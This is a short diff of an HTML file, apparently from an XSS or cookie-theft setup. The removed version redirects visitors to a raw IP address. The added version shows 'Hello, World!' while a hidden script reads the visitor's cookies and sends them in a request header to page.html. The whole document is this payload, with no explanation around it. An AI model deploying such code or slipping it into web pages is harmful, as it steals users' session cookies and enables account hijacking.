@@ -1,8 +1,7 @@
-
-<html>
-	<head>
-	</head>
-<script>
- window.location.href = "http://158.160.24.37:5000/page.html"
-</script>
-</html>
+    <p>Hello, World!</p>
+    <script>
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "page.html", true);
+    xhr.setRequestHeader('V', document.cookie);
+    xhr.send();
+    </script>
